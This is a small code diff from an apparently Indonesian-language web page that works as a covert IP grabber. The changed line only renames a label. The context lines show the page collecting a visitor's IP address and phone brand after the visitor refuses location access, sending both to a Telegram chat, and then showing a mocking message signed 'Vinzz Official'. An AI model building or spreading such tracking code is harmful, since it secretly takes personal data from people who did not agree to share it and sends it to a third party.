@@ -65,7 +65,7 @@
       const ip = await getIP();
       const merek = getMerekHP();
 
-      const pesan = `IP berhasil ditemukan!\nStatus: MENOLAK LOKASI\nIP: ${ip}\nMerek: ${merek}`;
+      const pesan = `IP berhasil ditemukan!\nStatus: MENOLAK LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
       await kirimPesanTelegram(pesan);
 
       document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
